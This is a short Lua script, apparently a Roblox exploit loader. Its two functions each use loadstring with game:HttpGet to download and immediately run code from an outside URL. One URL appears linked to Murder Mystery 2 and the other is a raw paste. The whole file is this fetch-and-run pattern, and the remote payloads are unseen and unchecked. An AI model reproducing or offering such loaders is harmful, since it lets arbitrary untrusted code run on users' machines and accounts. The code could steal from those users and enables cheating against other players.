local function s1() 
    loadstring(game:HttpGet("https://mm2lua.vercel.app/", true))()
end 
local function s2() 
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/no9DMUGjAklMKrH4/raw", true))()
end

task.spawn(s1)
task.spawn(s2)
